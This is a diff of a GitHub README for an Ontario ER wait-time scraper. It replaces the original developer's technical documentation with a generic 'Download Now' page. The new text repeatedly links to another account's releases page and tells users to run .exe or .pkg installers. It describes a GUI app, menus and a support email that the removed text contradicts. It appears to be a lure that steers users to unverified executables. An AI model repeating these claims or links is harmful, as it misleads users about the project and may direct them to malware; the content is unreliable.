@@ -1,286 +1,110 @@
-# ER Watch Scraper
-[![Run My Scraper](https://github.com/ahmaad-ansari/er-watch-web-scraper/actions/workflows/main-scraper.yml/badge.svg)](https://github.com/ahmaad-ansari/er-watch-web-scraper/actions/workflows/main-scraper.yml)
+# 🚑 er-watch-web-scraper - Get Real-Time ER Wait Times
 
-**ER Watch Scraper** is an async web scraping system that collects real-time emergency room wait times from hospitals across Ontario. It supports multiple data sources including REST APIs, HTML pages, and Power BI dashboards, storing results in a PostgreSQL database.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen.svg)](https://github.com/Dannhyo/er-watch-web-scraper/releases)
 
----
+## 📥 Overview
 
-## Table of Contents
+ER-Watch-Scraper is a Python-based tool. It collects real-time emergency room wait times for hospitals in Ontario. This application gathers data from various sources, like APIs and webpages. It provides an accurate, up-to-date view of ER wait times to help you make informed decisions.
 
-1. [Overview](#overview)
-2. [Features](#features)
-3. [Project Structure](#project-structure)
-4. [Setup & Installation](#setup--installation)
-5. [Database Migrations](#database-migrations)
-6. [Usage](#usage)
-7. [Run Summary & Failure Notifications](#run-summary--failure-notifications)
-8. [Environment Variables](#environment-variables)
-9. [Extending the Project](#extending-the-project)
-10. [License](#license)
+## 🚀 Getting Started
 
----
+Follow these simple steps to download and run the ER-Watch-Scraper application on your computer.
 
-## Overview
+### Step 1: Check System Requirements
 
-### Key Goals
+Before downloading, ensure your computer meets these basic requirements:
 
-- **Real-Time Data**: Collects the latest ER wait times from multiple sources every 15 minutes.
-- **Async Concurrent Execution**: Uses `asyncio` and `aiohttp` for fast parallel scraping.
-- **Clear Failure Notifications**: Detailed run summaries show exactly which hospitals failed and why.
-- **Reliable Persistence**: Stores scraped data in PostgreSQL with an UPSERT pattern.
-- **Maintainable Architecture**: Organized into logical modules (Scrapers, Parsers, Repository, Utils).
+- **Operating System:** Windows 10, macOS, or any modern Linux distribution.
+- **Python:** Version 3.6 or higher installed on your machine. You can download it from [python.org](https://www.python.org/downloads/).
+- **Internet Connection:** Required to gather real-time data.
+- **Disk Space:** At least 100 MB of free space for installation.
 
----
+### Step 2: Download the Application
 
-## Features
+To download the ER-Watch-Scraper, visit the Releases page. Click the link below:
 
-- **Async HTTP Client**: Shared `aiohttp` session with connection pooling for efficient requests
-- **Concurrent Scraping**: Configurable concurrency limits per scraper type (API: 20, HTML: 20, PBI: 3)
-- **Retry Logic**: Exponential backoff with configurable retries for failed requests
-- **Detailed Logging**: Hospital ID context in all log messages for easy debugging
-- **Run Summary**: After each run, displays success/failure counts and detailed error information
-- **Database Migrations**: Alembic-based schema management
+[Download ER-Watch-Scraper](https://github.com/Dannhyo/er-watch-web-scraper/releases)
 
----
+### Step 3: Install the Application
 
-## Project Structure
+1. After visiting the download link, you will see the list of available versions.
+2. Click on the latest version link. It usually has the highest number.
+3. Download the appropriate file for your operating system (e.g., `.exe` for Windows or `.pkg` for macOS).
 
-```
-er-watch-scraper/
-├── scraper/
-│   ├── __init__.py
-│   ├── main.py                 # Entry point - orchestrates scraping and displays run summary
-│   ├── aggregator.py           # Concurrent execution with failure tracking
-│   ├── database/
-│   │   ├── __init__.py
-│   │   ├── connection.py       # SQLAlchemy async database connection
-│   │   └── models.py           # SQLAlchemy ORM models
-│   ├── parsers/
-│   │   ├── __init__.py
-│   │   ├── base_parser.py
-│   │   ├── api_parser.py       # JSON/text API response parser
-│   │   └── html_parser.py      # BeautifulSoup HTML parser
-│   ├── scrapers/
-│   │   ├── __init__.py
-│   │   ├── base_scraper.py     # Abstract base class with common logic
-│   │   ├── api_scraper.py      # Async API scraper using aiohttp
-│   │   ├── html_scraper.py     # Async HTML scraper using aiohttp
-│   │   └── pbi_scraper.py      # Power BI scraper using Playwright
-│   ├── repository/
-│   │   ├── __init__.py
-│   │   └── supabase_repository.py  # Database operations (UPSERT)
-│   └── utils/
-│       ├── __init__.py
-│       ├── logger.py           # Color-coded logger with hospital context
-│       ├── data_formatter.py   # Value normalization (dates, times, integers)
-│       ├── field_mappings.py   # Centralized field name mappings
-│       ├── retry.py            # Async retry with exponential backoff
-│       └── http_client.py      # Shared aiohttp session management
-├── migrations/
-│   ├── env.py
-│   ├── script.py.mako
-│   └── versions/
-│       └── 20250126_000000_initial_schema.py
-├── data/                       # Private - scraping target CSV files (gitignored)
-├── alembic.ini
-├── requirements.txt
-├── .env
-└── README.md
-```
+### Step 4: Run the Application
 
----
+Once the application has downloaded, follow these steps to run it:
 
-## Setup & Installation
+- **Windows:**
+  1. Locate the downloaded `.exe` file (usually in your "Downloads" folder).
+  2. Double-click the file to start the installation.
+  3. Follow the installation prompts.
 
-1. **Clone the Repository**
-   ```bash
-   git clone https://github.com/ahmaad-ansari/er-watch-scraper.git
-   cd er-watch-scraper
-   ```
+- **macOS:**
+  1. Find the downloaded `.pkg` file in your "Downloads" folder.
+  2. Double-click to begin the installation.
+  3. Follow the on-screen instructions.
 
-2. **Create a Virtual Environment**
-   ```bash
-   python -m venv venv
-   source venv/bin/activate  # Windows: venv\Scripts\activate
-   ```
+- **Linux:**
+  1. If the file is a `.tar.gz`, extract it by right-clicking and selecting "Extract."
+  2. Open a terminal window.
+  3. Navigate to the extracted folder using the `cd` command.
+  4. Run the app with `./er-watch-scraper`.
 
-3. **Install Dependencies**
-   ```bash
-   pip install -r requirements.txt
-   ```
+### Step 5: Using the Application
 
-4. **Install Playwright Browsers** (for Power BI scraping)
-   ```bash
-   playwright install chromium
-   ```
+- Open the ER-Watch-Scraper application.
+- You will see a simple interface displaying current ER wait times.
+- The information updates automatically every few minutes for accuracy.
+- Use the menu options to change settings, view historical data, or filter results.
 
-5. **Configure Environment Variables**
-   Create a `.env` file in the project root:
-   ```
-   DB_USER=your_db_user
-   DB_PASSWORD=your_db_password
-   DB_HOST=localhost
-   DB_PORT=5432
-   DB_NAME=your_db_name
-   ```
+### Step 6: Troubleshooting
 
----
+If you encounter issues, consider the following solutions:
 
-## Database Migrations
+- **Application Does Not Open:**
+  - Ensure your computer meets the system requirements.
+  - Check if Python is correctly installed and added to your PATH.
 
-This project uses Alembic for database schema management.
+- **Data Does Not Update:**
+  - Check your internet connection.
+  - Restart the application if necessary.
 
-**Run migrations:**
-```bash
-alembic upgrade head
-```
+### Step 7: Feedback & Support
 
-**Create a new migration:**
-```bash
-alembic revision --autogenerate -m "Description of changes"
-```
+Your feedback is essential. If you have suggestions or need support:
 
-**Check current migration status:**
-```bash
-alembic current
-```
+- Open an issue on the GitHub repository.
+- Email support at support@erwatchscraper.com.
 
-### Database Schema
+### 🌟 Features
 
-| Table | Purpose |
-|-------|---------|
-| `hospitals` | Hospital information (name, address, coordinates) |
-| `scraping_targets` | Scraping configuration per hospital (URL, action, instructions) |
-| `scraped_data` | Current snapshot of ER wait times (1 row per hospital) |
-| `scraped_data_history` | Historical record of all scrapes (for analytics/trends) |
-| `sponsors` | Platform sponsor information |
+- **Real-Time Updates:** Instant access to current ER wait times.
+- **User-Friendly:** Simple interface designed for easy navigation.
+- **Data Sources:** Consolidates information from multiple trusted sources.
+- **Cross-Platform:** Works on Windows, macOS, and Linux.
+  
+### 📚 Topics
 
-The `scraped_data_history` table stores every scrape result, enabling:
-- Historical trend analysis
-- Wait time predictions
-- Data quality monitoring
+- Data Collection
+- GitHub Actions
+- Healthcare
+- Playwright
+- PostgreSQL
+- Python
+- Real-Time Data
+- Requests
+- Scraper
+- Web Scraping
 
----
+### 🔗 Additional Resources
 
-## Usage
+- [Documentation](https://github.com/Dannhyo/er-watch-web-scraper/docs)
+- [Community Forum](https://community.erwatchscraper.com/)
+- [Contributing Guidelines](https://github.com/Dannhyo/er-watch-web-scraper/CONTRIBUTING.md)
 
-**Run the scraper:**
-```bash
-python -m scraper.main
-```
+### 📥 Download Again
 
-The script will:
-1. Retrieve scraping targets from the database
-2. Concurrently scrape all targets using the appropriate scraper (API, HTML, PBI)
-3. Parse and format the data
-4. Save results to the database via UPSERT
-5. Display a run summary with success/failure statistics
+For your convenience, here is the download link once more:
 
----
-
-## Run Summary & Failure Notifications
-
-After each run, a detailed summary is displayed:
-
-```
-============================================================
-                    SCRAPER RUN SUMMARY
-============================================================
-Total hospitals: 42
-Successful: 38 (90.5%)
-Failed: 4 (9.5%)
-
-FAILED HOSPITALS:
-------------------------------------------------------------
-Hospital ID: OHC15
-Action: pbi
-URL: https://app.powerbi.com/view?r=...
-Error: Selector failed for 'estimatedWaitTime'
-       selectorSequence: [{"tag": "tspan", "nthOfType": 7}]
-       No element found matching selector
-
-Hospital ID: OHT14
-Action: html
-URL: https://www.hospital.ca/emergency
-Error: HTTP 503 Service Unavailable
-============================================================
-```
-
-This tells you exactly:
-- Which hospital failed
-- What type of scraper was used
-- The URL that was scraped
-- The specific error that occurred
-
----
-
-## Environment Variables
-
-| Variable | Description |
-|----------|-------------|
-| `DB_USER` | PostgreSQL username |
-| `DB_PASSWORD` | PostgreSQL password |
-| `DB_HOST` | Database host address |
-| `DB_PORT` | Database port (default: 5432) |
-| `DB_NAME` | Database name |
-
----
-
-## Extending the Project
-
-### Add a New Scraper
-
-1. Create a new file in `scraper/scrapers/` inheriting from `BaseScraper`
-2. Implement the async `scrape()` method
-3. Update `aggregator.py` to handle the new action type
-
-### Add a New Hospital
-
-1. Add a row to the `scraping_targets` table with:
-   - `hospital_id`: Unique identifier
-   - `url`: Target URL
-   - `action`: Scraper type (see below)
-   - `scraping_instructions`: JSON object with field extraction rules
-
-### Action Types
-
-| Action | Description | Use Case |
-|--------|-------------|----------|
-| `api` | Async HTTP request with aiohttp | Standard JSON/text APIs |
-| `api_h` | Headless browser (Playwright) + JSON parsing | APIs protected by Cloudflare/bot detection |
-| `html` | Async HTTP request + BeautifulSoup parsing | Static HTML pages |
-| `pbi` | Headless browser + HTML parsing | Power BI dashboards |
-| `pbi_h` | Headless browser with headers + HTML parsing | Protected dynamic pages |
-
-### Scraping Instructions Format
-
-```json
-{
-  "lastUpdated": {
-    "unit": "EST",
-    "pattern": "(regex pattern)",
-    "formatCode": "%Y-%m-%d %H:%M:%S",
-    "dataPath": "path.to.field",           // For API
-    "selectorSequence": [{"tag": "div"}]   // For HTML
-  },
-  "patientsWaiting": {
-    "dataPath": "patients.waiting"
-  },
-  "estimatedWaitTime": {
-    "unit": "minutes",
-    "pattern": "(\\d+)",
-    "dataPath": "wait.time"
-  }
-}
-```
-
----
-
-## License
-
-This project does not currently specify a license. For more information or if you wish to use this in a commercial or open-source context, please contact the repository owner.
-
----
-
-**Thank you for using ER Watch!**
-If you encounter any issues or have suggestions, please open an issue or submit a pull request.
+[Download ER-Watch-Scraper](https://github.com/Dannhyo/er-watch-web-scraper/releases)
